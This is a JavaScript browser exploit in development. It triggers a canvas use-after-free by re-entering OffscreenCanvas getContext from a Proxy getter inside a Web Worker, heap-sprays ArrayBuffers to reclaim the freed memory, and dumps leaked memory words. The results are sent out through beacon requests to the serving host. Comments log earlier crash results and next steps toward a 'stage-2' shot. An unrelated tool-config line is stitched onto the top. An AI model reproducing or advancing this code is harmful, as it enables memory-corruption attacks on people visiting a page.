mise ~/.config/mise/config.toml tools: gh@2.102.0
// fa-canvas-worker — v6: run the canvas-UAF matrix inside a QUIET Worker
//
// v5d D1 (v3-config control, no saves/marker/spray) died at the first
// stale READ. The only proven-safe stale touch is after a LIVE-CONTEXT
// reclaim (v3 run 3 R2, 4/4). Hypotheses for the bare-read death:
//   (a) the 384-512 context class is so hot that main-thread noise (the
//       beacon XHR itself) reclaims the freed slot between free and touch;
//   (b) small freed FastMalloc blocks do not stay mapped (granule decommit)
//       — "freed stays mapped" may only hold for large blocks;
//   (c) the getter-side save/marker steps crash inside the conversion
//       (untested: D1 died before D2-D5 could run).
//
// v6 moves the ENTIRE matrix into a Worker: no DOM activity, no XHR in the
// critical window, beacons via postMessage (relayed to HTTP beacons by the
// main thread BETWEEN rounds, after each round's risky ops). If OffscreenCanvas
// is exposed in the worker, the bug's OffscreenCanvas::getContext branch is
// used (same missing re-check, same Vector<State,1> state stack); otherwise
// a silent main-thread matrix runs as fallback (buffered beacons, flushed
// after each round's read).
//
// Worker rounds (buffered, one postMessage per round):
//   W-D1: plain double-create + read                    (control)
//   W-D2: + save() x1
//   W-D3: + save() x1 + marker                           (v4 config)
//   W-D4: + save() x8
//   W-D5: + save() x8 + marker                           (v5 config)
//   W-S1: v5 config + AB spray 1792-4352 + read/write    (the stage-2 shot)
//
// Beacon prefix: VCW-  (worker rows are VCW-W-*)
(function() {
  var BASE = location.protocol + '//' + location.host;
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      var u = BASE + '/beacon/VCW-' + tag + '?t=' + Date.now();
      if (body) u += '&d=' + encodeURIComponent(String(body).substring(0, 300));
      x.open('GET', u, true);
      x.send();
    } catch(e) {}
  }

  B('BOOT');

  var MARKER = 6.02214076e23;

  var workerCode = function() {
    var MARKER = 6.02214076e23;

    function makeCanvas() { return new OffscreenCanvas(8, 8); }

    function diagRound(i, nSaves, useMarker) {
      var log = [];
      function R(tag, body) { log.push(tag + (body !== '' ? '=' + body : '')); }
      R('D' + i + '-START', 'saves=' + nSaves + ' marker=' + useMarker);
      var canvas = makeCanvas();
      var inner = null, called = false;
      var settings = new Proxy({}, {
        get: function(t, prop) {
          if (!called && typeof prop === 'string' &&
              prop !== 'then' && prop !== 'toJSON') {
            called = true;
            R('D' + i + '-GETTER', String(prop));
            inner = canvas.getContext('2d');
            R('D' + i + '-INNER', 'ok=' + !!inner);
            if (inner) {
              var sv;
              for (sv = 0; sv < nSaves; sv++) inner.save();
              if (sv === nSaves) R('D' + i + '-SAVES-OK', String(nSaves));
              if (useMarker) {
                inner.lineWidth = MARKER;
                R('D' + i + '-MARKER-OK', '');
              }
            }
          }
          return undefined;
        }
      });
      var outer = null;
      try {
        outer = canvas.getContext('2d', settings);
        R('D' + i + '-OUTER', 'ok=' + !!outer + ' same=' + (inner === outer));
      } catch (e) {
        R('D' + i + '-OUTER-X', String(e && e.message || e).substring(0, 80));
      }
      if (inner) {
        try { R('D' + i + '-RD', 'lw=' + inner.lineWidth); }
        catch (e) { R('D' + i + '-RD-X', String(e).substring(0, 60)); }
      }
      if (outer) {
        try { outer.fillRect(0, 0, 2, 2); R('D' + i + '-OUTER-FILL-OK', ''); }
        catch (e) { R('D' + i + '-OUTER-FILL-X', ''); }
      }
      R('D' + i + '-SURVIVED', '');
      return log;
    }

    function sprayRound(i) {
      var log = [];
      function R(tag, body) { log.push(tag + (body !== '' ? '=' + body : '')); }
      R('S' + i + '-START', '');
      var canvas = makeCanvas();
      var inner = null, called = false;
      var settings = new Proxy({}, {
        get: function(t, prop) {
          if (!called && typeof prop === 'string' &&
              prop !== 'then' && prop !== 'toJSON') {
            called = true;
            inner = canvas.getContext('2d');
            for (var sv = 0; sv < 8; sv++) inner.save();
            inner.lineWidth = MARKER;
          }
          return undefined;
        }
      });
      var outer = canvas.getContext('2d', settings);
      // silent zone: state buffer freed, spray immediately (1.8-4.4KB only)
      var PER = 25, abs = [], views = [];
      for (var s = 1792; s <= 4352; s += 128) {
        for (var c = 0; c < PER; c++) {
          var ab = new ArrayBuffer(s);
          abs.push(ab);
          views.push(new Float64Array(ab));
        }
      }
      var rd;
      try { rd = inner ? inner.lineWidth : 'noinner'; }
      catch (e) { rd = 'X'; }
      if (rd === MARKER) {
        R('S' + i + '-MISS', 'rd=marker');
      } else if (rd === 0) {
        try { inner.lineWidth = 1.717; } catch (e) { R('S' + i + '-WT-X', ''); }
        var hitIdx = -1, hitOff = -1;
        outer2:
        for (var j = 0; j < views.length; j++) {
          for (var o = 0; o < views[j].length; o++) {
            if (views[j][o] === 1.717) { hitIdx = j; hitOff = o * 8; break outer2; }
          }
        }
        R('S' + i + '-HIT', 'ab=' + hitIdx + ' size=' +
          (hitIdx >= 0 ? abs[hitIdx].byteLength : -1) + ' off=' + hitOff);
        if (hitIdx >= 0) {
          try { inner.setLineDash([1.5, 2.5, 3.5, 4.5]); } catch (e) { R('S' + i + '-LD-X', ''); }
          var u8 = new Uint32Array(abs[hitIdx]);
          var out = [], found = 0;
          for (var q = 0; q + 1 < u8.length && found < 16; q += 2) {
            if (u8[q] === 0 && u8[q + 1] === 0) continue;
            if (q * 4 === hitOff) continue;
            var lo = u8[q], hi = u8[q + 1];
            var h = function(n) {
              var r = '';
              for (var b = 3; b >= 0; b--) {
                var by = (n >>> (8 * b)) & 0xff;
                r += (by < 16 ? '0' : '') + by.toString(16);
              }
              return r;
            };
            out.push((q * 4) + ':' + h(hi) + h(lo));
            found++;
          }
          for (var f = 0; f < out.length; f++) R('S' + i + '-LEAK' + f, out[f]);
        }
      } else {
        R('S' + i + '-RD', 'rd=' + String(rd).substring(0, 24));
      }
      R('S' + i + '-SURVIVED', '');
      return log;
    }

    self.onmessage = function(e) {
      if (e.data.cmd === 'fp') {
        var has = typeof OffscreenCanvas !== 'undefined';
        self.postMessage({ round: 'FP', log: ['offscreen=' + has] });
        return;
      }
      if (e.data.cmd === 'run') {
        var seq = e.data.seq; // array of ['D', i, saves, marker] or ['S', i]
        for (var k = 0; k < seq.length; k++) {
          var s = seq[k];
          var log;
          if (s[0] === 'D') log = diagRound(s[1], s[2], s[3]);
          else log = sprayRound(s[1]);
          self.postMessage({ round: 'R' + k, log: log });
        }
        self.postMessage({ round: 'DONE', log: [] });
      }
    };
  };

  var blob = new Blob(['(' + workerCode.toString() + ')()'], { type: 'application/javascript' });
  var worker = new Worker(URL.createObjectURL(blob));

  worker.onerror = function(e) { B('WERR', String(e.message || e).substring(0, 120)); };
  worker.onmessage = function(e) {
    var round = e.data.round, log = e.data.log || [];
    if (round === 'FP') {
      B('W-FP', log.join(' '));
      var hasOffscreen = /offscreen=true/.test(log.join(' '));
      if (!hasOffscreen) {
        B('W-DONE', 'no-offscreen-in-worker');
        return;
      }
      // run the matrix: D1 control, then the configs, then the stage-2 shot
      worker.postMessage({ cmd: 'run', seq: [
        ['D', 1, 0, false],
        ['D', 2, 1, false],
        ['D', 3, 1, true],
        ['D', 4, 8, false],
        ['D', 5, 8, true],
        ['S', 1],
        ['S', 2]
      ] });
      return;
    }
    for (var i = 0; i < log.length; i++) B('W-' + round + '-' + log[i].split('=')[0], log[i]);
    if (round === 'DONE') B('DONE-ALL-SURVIVED');
  };

  B('PLAN', 'worker-matrix');
  worker.postMessage({ cmd: 'fp' });
})();
